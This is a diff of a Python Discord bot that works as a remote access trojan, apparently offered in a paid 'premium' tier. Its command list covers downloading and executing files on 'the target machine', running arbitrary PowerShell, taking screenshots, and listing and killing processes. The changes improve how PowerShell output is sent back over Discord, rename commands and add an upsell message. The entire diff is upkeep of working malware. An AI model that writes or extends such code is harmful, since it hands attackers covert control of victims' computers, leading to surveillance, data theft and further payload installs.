@@ -7,8 +7,11 @@ import urllib.parse
 import urllib.request
 
 import cv2
+import webbrowser
+import psutil
 import discord
 from discord.ext import commands
+from dotenv import load_dotenv
 import io
 import pyautogui
 import requests
@@ -117,7 +120,7 @@ async def bot_help(ctx):
 !set_payload <URL> - Download and execute a file from the provided URL
 !powershell - Execute a PowerShell command on the target machine
 !screenshot - Take a screenshot of the target machine's screen
-!get_process_list - Get a list of running processes on the target machine
+!list_process - Get a list of running processes on the target machine
 !kill_process <name> - Kill a specified process on the target machine
 !sys_info - Get information about the target machine's operating system
 !open_website <URL> - Open a specified URL on the target machine
@@ -133,21 +136,27 @@ async def powershell(ctx, *, command: str):
         powershell_command = f'powershell.exe -Command "{command}"'
         output = subprocess.check_output(powershell_command, shell=True, stderr=subprocess.STDOUT, timeout=10)
         output = output.decode('utf-8')
-        await ctx.send(f'```{output}```')
+
+        # Split the output into chunks of maximum 2000 characters
+        chunks = [output[i:i + 2000] for i in range(0, len(output), 2000)]
+        for chunk in chunks:
+            await ctx.send(f'{chunk}')
     except subprocess.CalledProcessError as e:
         await ctx.send(f'Error executing PowerShell command: {e.output.decode("utf-8")}')
     except subprocess.TimeoutExpired:
         await ctx.send('The PowerShell command timed out.')
 
-# Command: Screenshot
 
+# Command: Screenshot
 @bot.command()
 async def screenshot(ctx):
     global command_count
+    if 'command_count' not in globals():
+        command_count = {}
 
     # Check if the user is already restricted
     if ctx.author.id in command_count and command_count[ctx.author.id] >= 5:
-        await ctx.send("You have reached the command usage limit. Please wait for the limit to reset.")
+        await ctx.send("You have reached the command usage limit. Please upgrade to the premium version.")
         return
 
     # Take a screenshot of the screen
@@ -179,12 +188,12 @@ async def list_process(ctx):
             process_chunks = [processes[i:i + 20] for i in range(0, len(processes), 20)]
             for chunk in process_chunks:
                 process_str = '\n'.join(chunk)
-                await ctx.send(f'List of running process:\n```{process_str}```')
+                await ctx.send(f'List of running processes:\n```{process_str}```')
         else:
-            await ctx.send('No process found.')
+            await ctx.send('No processes found.')
 
     except Exception as e:
-        await ctx.send(f'Error listing process: {str(e)}')
+        await ctx.send(f'Error listing processes: {str(e)}')
 
 # Command : Kill Process
 @bot.command()
